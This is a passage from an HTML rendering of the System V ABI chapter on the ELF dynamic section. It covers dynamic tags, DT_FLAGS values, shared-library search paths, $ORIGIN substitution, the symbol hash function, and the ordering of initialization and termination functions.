<tr>
<td><code>DT_SONAME</code></td>
<td><code>14</code></td>
<td><code>d_val</code></td>
<td>ignored</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RPATH*</code></td>
<td><code>15</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>ignored</td>
</tr>
<tr>
<td><code>DT_SYMBOLIC*</code></td>
<td><code>16</code></td>
<td>ignored</td>
<td>ignored</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_REL</code></td>
<td><code>17</code></td>
<td><code>d_ptr</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RELSZ</code></td>
<td><code>18</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RELENT</code></td>
<td><code>19</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_PLTREL</code></td>
<td><code>20</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_DEBUG</code></td>
<td><code>21</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>ignored</td>
</tr>
<tr>
<td><code>DT_TEXTREL*</code></td>
<td><code>22</code></td>
<td>ignored</td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_JMPREL</code></td>
<td><code>23</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_BIND_NOW*</code></td>
<td><code>24</code></td>
<td>ignored</td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_INIT_ARRAY</code></td>
<td><code>25</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_FINI_ARRAY</code></td>
<td><code>26</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_INIT_ARRAYSZ</code></td>
<td><code>27</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_FINI_ARRAYSZ</code></td>
<td><code>28</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RUNPATH</code></td>
<td><code>29</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_FLAGS</code></td>
<td><code>30</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_ENCODING</code></td>
<td><code>32</code></td>
<td>unspecified</td>
<td>unspecified</td>
<td>unspecified</td>
</tr>
<tr>
<td><code>DT_PREINIT_ARRAY</code></td>
<td><code>32</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>ignored</td>
</tr>
<tr>
<td><code>DT_PREINIT_ARRAYSZ</code></td>
<td><code>33</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>ignored</td>
</tr>
<tr>
<td><code>DT_SYMTAB_SHNDX</code></td>
<td><code>34</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_LOOS</code></td>
<td><code>0x6000000D</code></td>
<td>unspecified</td>
<td>unspecified</td>
<td>unspecified</td>
</tr>
<tr>
<td><code>DT_HIOS</code></td>
<td><code>0x6ffff000</code></td>
<td>unspecified</td>
<td>unspecified</td>
<td>unspecified</td>
</tr>
<tr>
<td><code>DT_LOPROC</code></td>
<td><code>0x70000000</code></td>
<td>unspecified</td>
<td>unspecified</td>
<td>unspecified</td>
</tr>
<tr>
<td><code>DT_HIPROC</code></td>
<td><code>0x7fffffff</code></td>
<td>unspecified</td>
<td>unspecified</td>
<td>unspecified</td>
</tr>
</tbody>
</table>
<p>* Signifies an entry that is at level 2.</p>
<hr>
<ul>
<li><p><code>DT_NULL</code></p>
<p>An entry with a <code>DT_NULL</code> tag marks the end of the <code>_DYNAMIC</code> array.</p>
</li>
<li><p><code>DT_NEEDED</code></p>
<p>This element holds the string table offset of a null-terminated string, giving the name of a needed library. The offset is an index into the table recorded in the <code>DT_STRTAB</code> code. See <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#shobj_dependencies" target="_blank" rel="external">&quot;Shared Object Dependencies&#39;&#39;</a> for more information about these names. The dynamic array may contain multiple entries with this type. These entries&#39; relative order is significant, though their relation to entries of other types is not.</p>
</li>
<li><p><code>DT_PLTRELSZ</code></p>
<p>This element holds the total size, in bytes, of the relocation entries associated with the procedure linkage table. If an entry of type <code>DT_JMPREL</code> is present, a <code>DT_PLTRELSZ</code> must accompany it.</p>
</li>
<li><p><code>DT_PLTGOT</code></p>
<p>This element holds an address associated with the procedure linkage table and/or the global offset table. See this section in the processor supplement for details.</p>
</li>
<li><p><code>DT_HASH</code></p>
<p>This element holds the address of the symbol hash table, described in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#hash" target="_blank" rel="external">&quot;Hash Table&#39;&#39;</a>. This hash table refers to the symbol table referenced by the <code>DT_SYMTAB</code> element.</p>
</li>
<li><p><code>DT_STRTAB</code></p>
<p>This element holds the address of the string table, described in Chapter 4. Symbol names, library names, and other strings reside in this table.</p>
</li>
<li><p><code>DT_SYMTAB</code></p>
<p>This element holds the address of the symbol table, described in the first part of this chapter, with <code>Elf32_Sym</code> entries for the 32-bit class of files and <code>Elf64_Sym</code> entries for the 64-bit class of files.</p>
</li>
<li><p><code>DT_RELA</code></p>
<p>This element holds the address of a relocation table, described in Chapter 4. Entries in the table have explicit addends, such as <code>Elf32_Rela</code> for the 32-bit file class or <code>Elf64_Rela</code> for the 64-bit file class. An object file may have multiple relocation sections. When building the relocation table for an executable or shared object file, the link editor catenates those sections to form a single table. Although the sections remain independent in the object file, the dynamic linker sees a single table. When the dynamic linker creates the process image for an executable file or adds a shared object to the process image, it reads the relocation table and performs the associated actions. If this element is present, the dynamic structure must also have <code>DT_RELASZ</code> and <code>DT_RELAENT</code> elements. When relocation is “mandatory&#39;&#39; for a file, either <code>DT_RELA</code> or <code>DT_REL</code> may occur (both are permitted but not required).</p>
</li>
<li><p><code>DT_RELASZ</code></p>
<p>This element holds the total size, in bytes, of the <code>DT_RELA</code> relocation table.</p>
</li>
<li><p><code>DT_RELAENT</code></p>
<p>This element holds the size, in bytes, of the <code>DT_RELA</code> relocation entry.</p>
</li>
<li><p><code>DT_STRSZ</code></p>
<p>This element holds the size, in bytes, of the string table.</p>
</li>
<li><p><code>DT_SYMENT</code></p>
<p>This element holds the size, in bytes, of a symbol table entry.</p>
</li>
<li><p><code>DT_INIT</code></p>
<p>This element holds the address of the initialization function, discussed in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#init_fini" target="_blank" rel="external">“Initialization and Termination Functions&#39;&#39;</a> below.</p>
</li>
<li><p><code>DT_FINI</code></p>
<p>This element holds the address of the termination function, discussed in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#init_fini" target="_blank" rel="external">“Initialization and Termination Functions&#39;&#39;</a> below. </p>
</li>
<li><p><code>DT_SONAME</code></p>
<p>This element holds the string table offset of a null-terminated string, giving the name of the shared object. The offset is an index into the table recorded in the <code>DT_STRTAB</code> entry. See <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#shobj_dependencies" target="_blank" rel="external">“Shared Object Dependencies&#39;&#39;</a> below for more information about these names. </p>
</li>
<li><p><code>DT_RPATH</code></p>
<p>This element holds the string table offset of a null-terminated search library search path string discussed in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#shobj_dependencies" target="_blank" rel="external">”Shared Object Dependencies&#39;&#39;</a>. The offset is an index into the table recorded in the <code>DT_STRTAB</code> entry. This entry is at level 2. Its use has been superseded by <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#dt_runpath" target="_blank" rel="external"><code>DT_RUNPATH</code></a>. </p>
</li>
<li><p><code>DT_SYMBOLIC</code></p>
<p>This element&#39;s presence in a shared object library alters the dynamic linker&#39;s symbol resolution algorithm for references within the library. Instead of starting a symbol search with the executable file, the dynamic linker starts from the shared object itself. If the shared object fails to supply the referenced symbol, the dynamic linker then searches the executable file and other shared objects as usual. This entry is at level 2. Its use has been superseded by the <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#df_symbolic" target="_blank" rel="external"><code>DF_SYMBOLIC</code></a> flag.</p>
</li>
<li><p><code>DT_REL</code></p>
<p>This element is similar to <code>DT_RELA</code>, except its table has implicit addends, such as <code>Elf32_Rel</code> for the 32-bit file class or <code>Elf64_Rel</code> for the 64-bit file class. If this element is present, the dynamic structure must also have<code>DT_RELSZ</code> and <code>DT_RELENT</code> elements.</p>
</li>
<li><p><code>DT_RELSZ</code></p>
<p>This element holds the total size, in bytes, of the <code>DT_REL</code> relocation table.</p>
</li>
<li><p><code>DT_RELENT</code></p>
<p>This element holds the size, in bytes, of the <code>DT_REL</code> relocation entry.</p>
</li>
<li><p><code>DT_PLTREL</code></p>
<p>This member specifies the type of relocation entry to which the procedure linkage table refers. The <code>d_val</code>member holds <code>DT_REL</code> or <code>DT_RELA</code>, as appropriate. All relocations in a procedure linkage table must use the same relocation.</p>
</li>
<li><p><code>DT_DEBUG</code></p>
<p>This member is used for debugging. Its contents are not specified for the ABI; programs that access this entry are not ABI-conforming.</p>
</li>
<li><p><code>DT_TEXTREL</code></p>
<p>This member&#39;s absence signifies that no relocation entry should cause a modification to a non-writable segment, as specified by the segment permissions in the program header table. If this member is present, one or more relocation entries might request modifications to a non-writable segment, and the dynamic linker can prepare accordingly. This entry is at level 2. Its use has been superseded by the <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#df_textrel" target="_blank" rel="external"><code>DF_TEXTREL</code></a> flag.</p>
</li>
<li><p><code>DT_JMPREL</code></p>
<p>If present, this entry&#39;s <code>d_ptr</code> member holds the address of relocation entries associated solely with the procedure linkage table. Separating these relocation entries lets the dynamic linker ignore them during process initialization, if lazy binding is enabled. If this entry is present, the related entries of types<code>DT_PLTRELSZ</code> and <code>DT_PLTREL</code> must also be present.</p>
</li>
<li><p><code>DT_BIND_NOW</code></p>
<p>If present in a shared object or executable, this entry instructs the dynamic linker to process all relocations for the object containing this entry before transferring control to the program. The presence of this entry takes precedence over a directive to use lazy binding for this object when specified through the environment or via <code>dlopen</code>(BA_LIB). This entry is at level 2. Its use has been superseded by the <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#df_bind_now" target="_blank" rel="external"><code>DF_BIND_NOW</code></a> flag.</p>
</li>
<li><p><code>DT_INIT_ARRAY</code></p>
<p>This element holds the address of the array of pointers to initialization functions, discussed in<a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#init_fini" target="_blank" rel="external"><code></code>Initialization and Termination Functions&#39;&#39;</a> below.</p>
</li>
<li><p><code>DT_FINI_ARRAY</code></p>
<p>This element holds the address of the array of pointers to termination functions, discussed in<a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#init_fini" target="_blank" rel="external"><code></code>Initialization and Termination Functions&#39;&#39;</a> below.</p>
</li>
<li><p><code>DT_INIT_ARRAYSZ</code></p>
<p>This element holds the size in bytes of the array of initialization functions pointed to by the <code>DT_INIT_ARRAY</code>entry. If an object has a <code>DT_INIT_ARRAY</code> entry, it must also have a <code>DT_INIT_ARRAYSZ</code> entry.</p>
</li>
<li><p><code>DT_FINI_ARRAYSZ</code></p>
<p>This element holds the size in bytes of the array of termination functions pointed to by the <code>DT_FINI_ARRAY</code>entry. If an object has a <code>DT_FINI_ARRAY</code> entry, it must also have a <code>DT_FINI_ARRAYSZ</code> entry.</p>
</li>
<li><p><code>DT_RUNPATH</code></p>
<p>This element holds the string table offset of a null-terminated library search path string discussed in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#shobj_dependencies" target="_blank" rel="external">”Shared Object Dependencies&#39;&#39;</a>. The offset is an index into the table recorded in the <code>DT_STRTAB</code> entry.</p>
</li>
<li><p><code>DT_FLAGS</code></p>
<p>This element holds flag values specific to the object being loaded. Each flag value will have the name <code>DF_</code><em>flag_name</em>. Defined values and their meanings are described <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#df_flags" target="_blank" rel="external">below</a>. All other values are reserved.</p>
</li>
<li><p><code>DT_PREINIT_ARRAY</code></p>
<p>This element holds the address of the array of pointers to pre-initialization functions, discussed in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#init_fini" target="_blank" rel="external">“Initialization and Termination Functions&#39;&#39;</a> below. The <code>DT_PREINIT_ARRAY</code> table is processed only in an executable file; it is ignored if contained in a shared object. </p>
</li>
<li><p><code>DT_PREINIT_ARRAYSZ</code></p>
<p>This element holds the size in bytes of the array of pre-initialization functions pointed to by the <code>DT_PREINIT_ARRAY</code> entry. If an object has a <code>DT_PREINIT_ARRAY</code> entry, it must also have a <code>DT_PREINIT_ARRAYSZ</code> entry. As with <code>DT_PREINIT_ARRAY</code>, this entry is ignored if it appears in a shared object.</p>
</li>
<li><p><code>DT_SYMTAB_SHNDX</code></p>
<p>This element holds the address of the <code>SHT_SYMTAB_SHNDX</code> section associated with the dynamic symbol table referenced by the <code>DT_SYMTAB</code> element.</p>
</li>
<li><p><code>DT_ENCODING</code></p>
<p>Values greater than or equal to <code>DT_ENCODING</code> and less than <code>DT_LOOS</code> follow the rules for the interpretation of the <code>d_un</code> union described <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#tag_encodings" target="_blank" rel="external">above</a>.</p>
</li>
<li><p><code>DT_LOOS</code> through <code>DT_HIOS</code></p>
<p>Values in this inclusive range are reserved for operating system-specific semantics. All such values follow the rules for the interpretation of the <code>d_un</code> union described <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#tag_encodings" target="_blank" rel="external">above</a>.</p>
</li>
<li><p><code>DT_LOPROC</code> through <code>DT_HIPROC</code></p>
<p>Values in this inclusive range are reserved for processor-specific semantics. If meanings are specified, the processor supplement explains them. All such values follow the rules for the interpretation of the <code>d_un</code>union described <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#tag_encodings" target="_blank" rel="external">above</a>.</p>
</li>
</ul>
<p>Except for the <code>DT_NULL</code> element at the end of the array, and the relative order of <code>DT_NEEDED</code> elements, entries may appear in any order. Tag values not appearing in the table are reserved.</p>
<hr>
<p>Figure 5-11: <code>DT_FLAGS</code> values</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>DF_ORIGIN</code></td>
<td><code>0x1</code></td>
</tr>
<tr>
<td><code>DF_SYMBOLIC</code></td>
<td><code>0x2</code></td>
</tr>
<tr>
<td><code>DF_TEXTREL</code></td>
<td><code>0x4</code></td>
</tr>
<tr>
<td><code>DF_BIND_NOW</code></td>
<td><code>0x8</code></td>
</tr>
<tr>
<td><code>DF_STATIC_TLS</code></td>
<td><code>0x10</code></td>
</tr>
</tbody>
</table>
<hr>
<ul>
<li><p><code>DF_ORIGIN</code></p>
<p>This flag signifies that the object being loaded may make reference to the <code>$ORIGIN</code> substitution string (see <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#substitution" target="_blank" rel="external">&quot;Substitution Sequences&#39;&#39;</a>). The dynamic linker must determine the pathname of the object containing this entry when the object is loaded. </p>
</li>
<li><p><code>DF_SYMBOLIC</code></p>
<p>If this flag is set in a shared object library, the dynamic linker&#39;s symbol resolution algorithm for references within the library is changed. Instead of starting a symbol search with the executable file, the dynamic linker starts from the shared object itself. If the shared object fails to supply the referenced symbol, the dynamic linker then searches the executable file and other shared objects as usual.</p>
</li>
<li><p><code>DF_TEXTREL</code></p>
<p>If this flag is not set, no relocation entry should cause a modification to a non-writable segment, as specified by the segment permissions in the program header table. If this flag is set, one or more relocation entries might request modifications to a non-writable segment, and the dynamic linker can prepare accordingly.</p>
</li>
<li><p><code>DF_BIND_NOW</code></p>
<p>If set in a shared object or executable, this flag instructs the dynamic linker to process all relocations for the object containing this entry before transferring control to the program. The presence of this entry takes precedence over a directive to use lazy binding for this object when specified through the environment or via <code>dlopen</code>(BA_LIB).</p>
</li>
<li><p><code>DF_STATIC_TLS</code></p>
<p>If set in a shared object or executable, this flag instructs the dynamic linker to reject attempts to load this file dynamically. It indicates that the shared object or executable contains code using a <em>static thread-local storage</em> scheme. Implementations need not support any form of thread-local storage.</p>
</li>
</ul>
<h3 id="Shared-Object-Dependencies"><a href="#Shared-Object-Dependencies" class="headerlink" title="Shared Object Dependencies"></a>Shared Object Dependencies</h3><p>When the link editor processes an archive library, it extracts library members and copies them into the output object file. These statically linked services are available during execution without involving the dynamic linker. Shared objects also provide services, and the dynamic linker must attach the proper shared object files to the process image for execution.</p>
<p>When the dynamic linker creates the memory segments for an object file, the dependencies (recorded in<code>DT_NEEDED</code> entries of the dynamic structure) tell what shared objects are needed to supply the program&#39;s services. By repeatedly connecting referenced shared objects and their dependencies, the dynamic linker builds a complete process image. When resolving symbolic references, the dynamic linker examines the symbol tables with a breadth-first search. That is, it first looks at the symbol table of the executable program itself, then at the symbol tables of the <code>DT_NEEDED</code> entries (in order), and then at the second level <code>DT_NEEDED</code> entries, and so on. Shared object files must be readable by the process; other permissions are not required.</p>
<hr>
<p> Even when a shared object is referenced multiple times in the dependency list, the dynamic linker will connect the object only once to the process.</p>
<hr>
<p>Names in the dependency list are copies either of the <code>DT_SONAME</code> strings or the path names of the shared objects used to build the object file. For example, if the link editor builds an executable file using one shared object with a <code>DT_SONAME</code> entry of <code>lib1</code> and another shared object library with the path name <code>/usr/lib/lib2</code>, the executable file will contain <code>lib1</code> and <code>/usr/lib/lib2</code> in its dependency list.</p>
<p>If a shared object name has one or more slash (<code>/</code>) characters anywhere in the name, such as <code>/usr/lib/lib2</code> or <code>directory/file</code>, the dynamic linker uses that string directly as the path name. If the name has no slashes, such as <code>lib1</code>, three facilities specify shared object path searching.</p>
<hr>
<ul>
<li><ul>
<li><p>The dynamic array tag DT_RUNPATH gives a string that holds a list of directories, separated by colons (:). For example, the string <code>/home/dir/lib:/home/dir2/lib:</code> tells the dynamic linker to search first the directory <code>/home/dir/lib</code> , then <code>/home/dir2/lib</code>, and then the current directory to find dependencies.</p>
<p>The set of directories specified by a given <code>DT_RUNPATH</code> entry is used to find only the immediate dependencies of the executable or shared object containing the <code>DT_RUNPATH</code> entry. That is, it is used only for those dependencies contained in the <code>DT_NEEDED</code> entries of the dynamic structure containing the <code>DT_RUNPATH</code> entry, itself. One object&#39;s <code>DT_RUNPATH</code> entry does not affect the search for any other object&#39;s dependencies.</p>
</li>
<li><p>A variable called  <code>LD_LIBRARY_PATH</code>in the process environment [see exec(BA_OS)] may hold a list of directories as above, optionally followed by a semicolon (;) and another directory list. The following values would be equivalent to the previous example:</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LD_LIBRARY_PATH=/home/dir/usr/lib:/home/dir2/usr/lib:</div></pre></td></tr></table></figure>
</li>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LD_LIBRARY_PATH=/home/dir/usr/lib;/home/dir2/usr/lib:</div></pre></td></tr></table></figure>
</li>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LD_LIBRARY_PATH=/home/dir/usr/lib:/home/dir2/usr/lib:;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>Although some programs (such as the link editor) treat the lists before and after the semicolon differently, the dynamic linker does not. Nevertheless, the dynamic linker accepts the semicolon notation, with the semantics described previously.</p>
<p>All <code>LD_LIBRARY_PATH</code> directories are searched before those from <code>DT_RUNPATH</code>.</p>
</li>
<li><p>Finally, if the other two groups of directories fail to locate the desired library, the dynamic linker searches the default directories, <code>/usr/lib</code> or such other directories as may be specified by the ABI supplement for a given processor.</p>
</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>When the dynamic linker is searching for shared objects, it is not a fatal error if an ELF file with the wrong attributes is encountered in the search. Instead, the dynamic linker shall exhaust the search of all paths before determining that a matching object could not be found. For this determination, the relevant attributes are contained in the following ELF header fields: <code>e_ident[EI_DATA]</code>, <code>e_ident[EI_CLASS]</code>,<code>e_ident[EI_OSABI]</code>, <code>e_ident[EI_ABIVERSION]</code>, <code>e_machine</code>, <code>e_type</code>, <code>e_flags</code> and <code>e_version</code>.</li>
</ul>
<hr>
<ul>
<li>For security, the dynamic linker ignores <code>LD_LIBRARY_PATH</code> for set-user and set-group ID programs. It does, however, search <code>DT_RUNPATH</code>  directories and the default directories. The same restriction may be applied to processes that have more than minimal privileges on systems with installed extended security mechanisms.</li>
</ul>
<hr>
<ul>
<li><p>A fourth search facility, the dynamic array tag  <code>DT_RPATH</code>, has been moved to level 2 in the ABI. It provides a colon-separated list of directories to search. Directories specified by <code>DT_RPATH</code> are searched before directories specified by <code>LD_LIBRARY_PATH</code></p>
</li>
<li><p>If both <code>DT_RPATH</code> and <code>DT_RUNPATH</code> entries appear in a single object&#39;s dynamic array, the dynamic linker processes only the <code>DT_RUNPATH</code> entry.</p>
</li>
</ul>
<hr>
<ul>
<li><h3 id="Substitution-Sequences"><a href="#Substitution-Sequences" class="headerlink" title="Substitution Sequences"></a>Substitution Sequences</h3></li>
<li><p>Within a string provided by dynamic array entries with the <code>DT_NEEDED</code> or <code>DT_RUNPATH</code> tags and in pathnames passed as parameters to the <code>dlopen()</code> routine, a dollar sign ($) introduces a substitution sequence. This sequence consists of the dollar sign immediately followed by either the longest name sequence or a name contained within left and right braces ({) and (}). A name is a sequence of bytes that start with either a letter or an underscore followed by zero or more letters, digits or underscores. If a dollar sign is not immediately followed by a name or a brace-enclosed name, the behavior of the dynamic linker is unspecified.</p>
</li>
<li><p>If the name is ”ORIGIN“, then the substitution sequence is replaced by the dynamic linker with the absolute pathname of the directory in which the object containing the substitution sequence originated. Moreover, the pathname will contain no symbolic links or use of  ”.&quot; or &quot;..&quot; components. Otherwise (when the name is not &quot;<code>ORIGIN</code>&#39;&#39;) the behavior of the dynamic linker is unspecified.</p>
</li>
<li><p>When the dynamic linker loads an object that uses <code>$ORIGIN</code>, it must calculate the pathname of the directory containing the object. Because this calculation can be computationally expensive, implementations may want to avoid the calculation for objects that do not use <code>$ORIGIN</code>. If an object calls <code>dlopen()</code> with a string containing <code>$ORIGIN</code> and does not use <code>$ORIGIN</code> in one if its dynamic array entries, the dynamic linker may not have calculated the pathname for the object until the <code>dlopen()</code> actually occurs. Since the application may have changed its current working directory before the <code>dlopen()</code> call, the calculation may not yield the correct result. To avoid this possibility, an object may signal its intention to reference <code>$ORIGIN</code> by setting the <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#df_flags" target="_blank" rel="external"><code>DF_ORIGIN</code> flag</a>. An implementation may reject an attempt to use <code>$ORIGIN</code>within a <code>dlopen()</code> call from an object that did not set the <code>DF_ORIGIN</code> flag and did not use <code>$ORIGIN</code> within its dynamic array.</p>
</li>
</ul>
<hr>
<ul>
<li>For security, the dynamic linker does not allow use of <code>$ORIGIN</code> substitution sequences for set-user and set-group ID programs. For such sequences that appear within strings specified by   <code>DT_RUNPATH</code> dynamic array entries, the specific search path containing the <code>$ORIGIN</code> sequence is ignored (though other search paths in the same string are processed). <code>$ORIGIN</code> sequences within a  <code>DT_NEEDED</code> entry or path passed as a parameter to  <code>dlopen()</code> are treated as errors. The same restrictions may be applied to processes that have more than minimal privileges on systems with installed extended security mechanisms.</li>
</ul>
<hr>
<ul>
<li><h3 id="Global-Offset-Table"><a href="#Global-Offset-Table" class="headerlink" title="Global Offset Table"></a>Global Offset Table</h3></li>
</ul>
<hr>
<ul>
<li>This section requires processor-specific information. The System V Application Binary Interface supplement for the desired processor describes the details.</li>
</ul>
<hr>
<ul>
<li><h3 id="Procedure-Linkage-Table"><a href="#Procedure-Linkage-Table" class="headerlink" title="Procedure Linkage Table"></a>Procedure Linkage Table</h3></li>
</ul>
<hr>
<ul>
<li>This section requires processor-specific information. The System V Application Binary Interface supplement for the desired processor describes the details.</li>
</ul>
<hr>
<ul>
<li><h3 id="Hash-Table"><a href="#Hash-Table" class="headerlink" title="Hash Table"></a>Hash Table</h3></li>
<li><p>A hash table of    <code>Elf32_Word</code> objects supports symbol table access. The same table layout is used for both the 32-bit and 64-bit file class. Labels appear below to help explain the hash table organization, but they are not part of the specification.</p>
</li>
</ul>
<hr>
<ul>
<li><p>Figure 5-12: Symbol Hash Table</p>
</li>
<li><p>| <code>nbucket</code>                         |<br>| --------------------------------- |<br>| <code>nchain</code>                          |<br>| <code>bucket[0]. . .bucket[nbucket-1]</code> |<br>| <code>chain[0]. . .chain[nchain-1]</code>    |</p>
</li>
</ul>
<hr>
<ul>
<li>The <code>bucket</code> array contains <code>nbucket</code> entries, and the <code>chain</code> array contains <code>nchain</code> entries; indexes start at 0. Both <code>bucket</code> and <code>chain</code> hold symbol table indexes. Chain table entries parallel the symbol table. The number of symbol table entries should equal <code>nchain</code>; so symbol table indexes also select chain table entries. A hashing function (shown below) accepts a symbol name and returns a value that may be used to compute a <code>bucket</code> index. Consequently, if the hashing function returns the value <em>x</em> for some name, <code>bucket[</code><em>x</em><code>%nbucket]</code> gives an index, <em>y</em>, into both the symbol table and the chain table. If the symbol table entry is not the one desired, <code>chain[</code><em>y</em><code>]</code> gives the next symbol table entry with the same hash value. One can follow the <code>chain</code> links until either the selected symbol table entry holds the desired name or the <code>chain</code>entry contains the value <code>STN_UNDEF</code>.</li>
</ul>
<hr>
<ul>
<li><p>Figure 5-13: Hashing Function</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">unsigned long</div><div class="line">elf_hash(const unsigned char *name)</div><div class="line">&#123;</div><div class="line">	unsigned long	h = 0, g;</div><div class="line">	while (*name)</div><div class="line">	&#123;</div><div class="line">		h = (h &lt;&lt; 4) + *name++;</div><div class="line">		if (g = h &amp; 0xf0000000)</div><div class="line">			h ^= g &gt;&gt; 24;</div><div class="line">		h &amp;= ~g;</div><div class="line">	&#125;</div><div class="line">	return h;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li><h3 id="Initialization-and-Termination-Functions"><a href="#Initialization-and-Termination-Functions" class="headerlink" title="Initialization and Termination Functions"></a>Initialization and Termination Functions</h3></li>
<li><p>After the dynamic linker has built the process image and performed the relocations, each shared object and the executable file get the opportunity to execute some initialization functions. All shared object initializations happen before the executable file gains control.</p>
</li>
<li><p>Before the initialization functions for any object A is called, the initialization functions for any other objects that object A depends on are called. For these purposes, an object A depends on another object B, if B appears in A&#39;s list of needed objects (recorded in the <code>DT_NEEDED</code> entries of the dynamic structure). The order of initialization for circular dependencies is undefined.</p>
</li>
<li><p>The initialization of objects occurs by recursing through the needed entries of each object. The initialization functions for an object are invoked after the needed entries for that object have been processed. The order of processing among the entries of a particular list of needed objects is unspecified.</p>
</li>
</ul>
<hr>
<ul>
<li>Each processor supplement may optionally further restrict the algorithm used to determine the order of initialization. Any such restriction, however, may not conflict with the rules described by this specification.</li>
</ul>
<hr>
<ul>
<li>The following example illustrates two of the possible correct orderings which can be generated for the example NEEDED lists. In this example the <em>a.out</em> is dependent on <code>b</code>, <code>d</code>, and <code>e</code>. <code>b</code> is dependent on <code>d</code> and <code>f</code>, while <code>d</code> is dependent on <code>e</code> and <code>g</code>. From this information a dependency graph can be drawn. The above algorithm on initialization will then allow the following specified initialization orderings among others.</li>
</ul>
<hr>
<ul>
<li><p>Figure 5-14: Initialization Ordering Example</p>
</li>
<li><p>​</p>
</li>
<li><p><img src="/images/2018-04-21/init_example.gif" alt="img"></p>
</li>
<li><p>​</p>
</li>
</ul>
<hr>
<ul>
<li><p>Similarly, shared objects and executable files may have termination functions, which are executed with the <code>atexit</code>(BA_OS) mechanism after the base process begins its termination sequence. The termination functions for any object A must be called before the termination functions for any other objects that object A depends on. For these purposes, an object A depends on another object B, if B appears in A&#39;s list of needed objects (recorded in the <code>DT_NEEDED</code> entries of the dynamic structure). The order of termination for circular dependencies is undefined.</p>
</li>
<li><p>Finally, an executable file may have pre-initialization functions. These functions are executed after the dynamic linker has built the process image and performed relocations but before any shared object initialization functions. Pre-initialization functions are not permitted in shared objects.</p>
</li>
</ul>
<hr>
<ul>
<li>Complete initialization of system libraries may not have occurred when pre-initializations are executed, so some features of the system may not be available to pre-initialization code. In general, use of pre-initialization code can be considered portable only if it has no dependencies on system libraries.</li>
</ul>
<hr>
<ul>
<li><p>The dynamic linker ensures that it will not execute any initialization, pre-initialization, or termination functions more than once.</p>
</li>
<li><p>Shared objects designate their initialization and termination code in one of two ways. First, they may specify the address of a function to execute via the <code>DT_INIT</code> and <code>DT_FINI</code> entries in the dynamic structure, described in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#dynamic_section" target="_blank" rel="external">&quot;Dynamic Section&#39;&#39;</a> above.</p>
</li>
</ul>
<hr>
<ul>
<li>Note that the address of a function need not be the same as a pointer to a function as defined by the processor supplement.</li>
</ul>
<hr>
<ul>
